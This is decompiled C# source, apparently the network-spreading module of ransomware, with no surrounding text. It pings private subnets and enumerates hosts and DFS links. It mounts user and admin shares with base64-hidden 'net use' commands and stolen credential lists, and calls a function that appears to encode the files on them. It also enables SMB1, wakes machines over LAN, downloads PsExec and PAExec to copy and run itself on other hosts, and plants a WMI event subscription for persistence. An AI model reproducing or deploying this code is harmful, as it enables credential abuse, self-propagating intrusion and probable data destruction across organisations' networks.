using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Complex;

internal class NetworkSpreading
{
	public class PC
	{
		public string ServerName { get; set; }
	}

	public enum ResourceScope
	{
		RESOURCE_CONNECTED = 1,
		RESOURCE_GLOBALNET,
		RESOURCE_REMEMBERED,
		RESOURCE_RECENT,
		RESOURCE_CONTEXT
	}

	public enum ResourceType
	{
		RESOURCETYPE_ANY,
		RESOURCETYPE_DISK,
		RESOURCETYPE_PRINT,
		RESOURCETYPE_RESERVED
	}

	public enum ResourceUsage
	{
		RESOURCEUSAGE_CONNECTABLE = 1,
		RESOURCEUSAGE_CONTAINER = 2,
		RESOURCEUSAGE_NOLOCALDEVICE = 4,
		RESOURCEUSAGE_SIBLING = 8,
		RESOURCEUSAGE_ATTACHED = 16,
		RESOURCEUSAGE_ALL = 19
	}

	public enum ResourceDisplayType
	{
		RESOURCEDISPLAYTYPE_GENERIC,
		RESOURCEDISPLAYTYPE_DOMAIN,
		RESOURCEDISPLAYTYPE_SERVER,
		RESOURCEDISPLAYTYPE_SHARE,
		RESOURCEDISPLAYTYPE_FILE,
		RESOURCEDISPLAYTYPE_GROUP,
		RESOURCEDISPLAYTYPE_NETWORK,
		RESOURCEDISPLAYTYPE_ROOT,
		RESOURCEDISPLAYTYPE_SHAREADMIN,
		RESOURCEDISPLAYTYPE_DIRECTORY,
		RESOURCEDISPLAYTYPE_TREE,
		RESOURCEDISPLAYTYPE_NDSCONTAINER
	}

	public class ServerEnum : IEnumerable
	{
		private enum ErrorCodes
		{
			NO_ERROR = 0,
			ERROR_NO_MORE_ITEMS = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class NETRESOURCE
		{
			public ResourceScope dwScope = (ResourceScope)0;

			public ResourceType dwType = ResourceType.RESOURCETYPE_ANY;

			public ResourceDisplayType dwDisplayType = ResourceDisplayType.RESOURCEDISPLAYTYPE_GENERIC;

			public ResourceUsage dwUsage = (ResourceUsage)0;

			public string lpLocalName = null;

			public string lpRemoteName = null;

			public string lpComment = null;

			public string lpProvider = null;
		}

		private ArrayList aData = new ArrayList();

		public int Count => aData.Count;

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetOpenEnumA(ResourceScope dwScope, ResourceType dwType, ResourceUsage dwUsage, NETRESOURCE p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern ErrorCodes WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(NETRESOURCE pRsrc, ResourceScope scope, ResourceType type, ResourceUsage usage, ResourceDisplayType displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == ErrorCodes.NO_ERROR)
			{
				ErrorCodes errorCodes;
				do
				{
					errorCodes = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (errorCodes)
					{
					case ErrorCodes.ERROR_NO_MORE_ITEMS:
						continue;
					case ErrorCodes.NO_ERROR:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.dwDisplayType == displayType)
						{
							aData.Add(pRsrc.lpRemoteName);
						}
						if ((pRsrc.dwUsage & ResourceUsage.RESOURCEUSAGE_CONTAINER) == ResourceUsage.RESOURCEUSAGE_CONTAINER)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (errorCodes != ErrorCodes.ERROR_NO_MORE_ITEMS);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public ServerEnum(ResourceScope scope, ResourceType type, ResourceUsage usage, ResourceDisplayType displayType)
		{
			NETRESOURCE pRsrc = new NETRESOURCE();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return aData.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DFS_INFO_3
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string EntryPath;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string Comment;

		public uint State;

		public uint NumberOfStorages;

		public IntPtr Storages;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DFS_STORAGE_INFO
	{
		public int State;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ServerName;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string ShareName;
	}

	public struct DFSLink
	{
		public string name;

		public string[] target;

		public DFSLink(string Name, string[] Target)
		{
			name = Name;
			target = Target;
		}
	}

	private const int MAX_PREFERRED_LENGTH = 268435455;

	private const int NERR_Success = 0;

	public static List<string> lanList = new List<string>();

	public static string MyIP = "";

	public static List<string> names = new List<string>();

	public static List<string> passes = new List<string>();

	public static List<string> IP = new List<string>();

	public List<string> endAddress = new List<string>();

	public List<string> networkAd = new List<string>();

	public List<string> startAddress = new List<string>();

	public static void NetworkScanner()
	{
		NetworkSpreading networkSpreading = GrabInfo();
		Parallel.ForEach(networkSpreading.startAddress, delegate(string address)
		{
			string text = address.Split(new char[1] { '.' })[0] + "." + address.Split(new char[1] { '.' })[1] + "." + address.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				scanner(text);
			}
		});
	}

	public static void scanner(string subnet)
	{
		Ping myPing;
		PingReply reply;
		IPAddress addr;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				myPing = new Ping();
				reply = myPing.Send(subnet + text, 900);
				if (reply.Status == IPStatus.Success)
				{
					try
					{
						addr = IPAddress.Parse(subnet + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(addr);
						if (Program.DizonList.Contains(string.Concat("\\\\", addr, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
						{
							return;
						}
						Program.SpList.Add(addr.ToString());
						try
						{
							if (Program.CredActivate == "YES")
							{
								Parallel.For(0, names.Count, delegate(int f)
								{
									Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), string.Concat("use \\\\", addr, "\\Users /USER:", names[f], " ", passes[f]));
									Thread.Sleep(Program.sleeper);
									Program.EncodeOnTheWay(string.Concat("\\\\", addr, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), string.Concat("use \\\\", addr, "\\", (char)g, "$ /USER:", names[f], " ", passes[f]));
										Thread.Sleep(Program.sleeper);
										Program.EncodeOnTheWay(string.Concat("\\\\", addr, "\\", (char)g, "$"));
									});
								});
							}
							else
							{
								Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), string.Concat("use \\\\", addr, "\\Users"));
								Thread.Sleep(Program.sleeper);
								Program.EncodeOnTheWay(string.Concat("\\\\", addr, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), string.Concat("use \\\\", addr, "\\", (char)g, "$"));
									Thread.Sleep(Program.sleeper);
									Program.EncodeOnTheWay(string.Concat("\\\\", addr, "\\", (char)g, "$"));
								});
							}
							return;
						}
						catch
						{
							return;
						}
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static NetworkSpreading GrabInfo()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		NetworkSpreading networkSpreading = new NetworkSpreading();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int j = 0; j < array3.Length; j++)
						{
							array3[j] = (byte)(addressBytes[j] & addressBytes2[j]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						networkSpreading.networkAd.Add(networkInterface.Name);
						networkSpreading.startAddress.Add(iPAddress2.ToString());
						networkSpreading.endAddress.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return networkSpreading;
	}

	public static List<PC> DisplayComputers()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<PC> list = new List<PC>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new PC
						{
							ServerName = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string DfsName, int Level, int PrefMaxLen, out IntPtr Buffer, [MarshalAs(UnmanagedType.I4)] out int EntriesRead, [MarshalAs(UnmanagedType.I4)] ref int ResumeHandle);

	public static List<DFSLink> GetDfsLinks(string sDFSRoot)
	{
		try
		{
			List<DFSLink> list = new List<DFSLink>();
			IntPtr Buffer = default(IntPtr);
			int EntriesRead = 0;
			int ResumeHandle = 0;
			if (NetDfsEnum(sDFSRoot, 3, 268435455, out Buffer, out EntriesRead, ref ResumeHandle) == 0)
			{
				for (int i = 0; i < EntriesRead; i++)
				{
					DFS_INFO_3 dFS_INFO_ = (DFS_INFO_3)Marshal.PtrToStructure(Buffer + i * Marshal.SizeOf(typeof(DFS_INFO_3)), typeof(DFS_INFO_3));
					if (dFS_INFO_.EntryPath == sDFSRoot)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < dFS_INFO_.NumberOfStorages; j++)
					{
						IntPtr ptr = new IntPtr(dFS_INFO_.Storages.ToInt64() + j * Marshal.SizeOf(typeof(DFS_STORAGE_INFO)));
						DFS_STORAGE_INFO dFS_STORAGE_INFO = (DFS_STORAGE_INFO)Marshal.PtrToStructure(ptr, typeof(DFS_STORAGE_INFO));
						if (dFS_STORAGE_INFO.State == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", dFS_STORAGE_INFO.ServerName, dFS_STORAGE_INFO.ShareName }));
						}
					}
					string text = dFS_INFO_.EntryPath.Replace(sDFSRoot, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new DFSLink(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void LocalNet()
	{
		Program.Empowered("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<PC> list = DisplayComputers();
		List<DFSLink> dfsLinks = GetDfsLinks(Environment.MachineName);
		if (dfsLinks != null)
		{
			foreach (DFSLink item in dfsLinks)
			{
				string[] target = item.target;
				foreach (string text in target)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (Program.CredActivate == "YES")
						{
							for (int j = 0; j < names.Count; j++)
							{
								Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), "use " + text + " /USER:" + names[j] + " " + passes[j]);
								Thread.Sleep(Program.sleeper);
								Program.EncodeOnTheWay(text);
							}
						}
						else
						{
							Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(Program.sleeper);
							Program.EncodeOnTheWay(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (PC item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (Program.CredActivate == "YES")
				{
					for (int j = 0; j < names.Count; j++)
					{
						Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), "use " + item2.ServerName + " /USER:" + names[j] + " " + passes[j]);
						Thread.Sleep(Program.sleeper);
						Program.EncodeOnTheWay(item2.ServerName);
					}
				}
				else
				{
					Program.ProcessCommand(Program.Base64Decode("bmV0LmV4ZQ=="), "use " + item2.ServerName);
					Thread.Sleep(Program.sleeper);
					Program.EncodeOnTheWay(item2.ServerName);
				}
			}
			catch
			{
			}
		}
	}

	public static void WMIExecute(string IP, string username, string password)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + IP + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(username);
			val2.get_Options().set_Password(password);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + IP + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void Run()
	{
		Program.EnableNetworkDiscovery();
		List<IPInfo> iPInfo = IPInfo.GetIPInfo();
		foreach (IPInfo item in iPInfo)
		{
			lanList.Add(item.IPAddress);
		}
		if (Program.SpList.Count > 0)
		{
			lanList = lanList.Union(Program.SpList).ToList();
		}
		string ToolFileName = "";
		string ToolFileName2 = "";
		try
		{
			ToolFileName = DownloadTool();
		}
		catch
		{
		}
		try
		{
			ToolFileName2 = DownloadTool1();
		}
		catch
		{
		}
		foreach (IPInfo item2 in iPInfo)
		{
			try
			{
				if (item2.IPAddress.StartsWith("10.") || item2.IPAddress.StartsWith("172.") || item2.IPAddress.StartsWith("192.168.") || item2.IPAddress.Contains(""))
				{
					WakeOnLan.WakeUp(item2.MacAddress, item2.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(lanList, delegate(string ip)
			{
				if ((ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("192.168.") || ip.Contains("")) && PingHost(ip))
				{
					if (Program.CredActivate == "YES")
					{
						for (int i = 0; i < names.Count; i++)
						{
							if (Program.paexuse)
							{
								if (File.Exists(ToolFileName))
								{
									Program.ProcessCommand(ToolFileName, "\\\\" + ip + " -u \"" + names[i] + "\" -p \"" + passes[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(ToolFileName2))
							{
								Program.ProcessCommand(ToolFileName2, "\\\\" + ip + " -u \"" + names[i] + "\" -p \"" + passes[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (Program.paexuse)
					{
						if (File.Exists(ToolFileName))
						{
							Program.ProcessCommand(ToolFileName, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(ToolFileName2))
					{
						Program.ProcessCommand(ToolFileName2, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(ToolFileName))
			{
				File.Delete(ToolFileName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(ToolFileName2))
			{
				File.Delete(ToolFileName2);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> GetLocalNetwork()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string DownloadTool()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string DownloadTool1()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri(Program.Base64Decode("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return DownloadFile(new Uri(Program.Base64Decode("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool PingHost(string nameOrAddress)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(nameOrAddress);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string DownloadFile(Uri Url)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> GetIPAddresses()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array3 = array;
			foreach (string add in array3)
			{
				if (add.Contains(":"))
				{
					array = array.Where((string o) => o != add).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
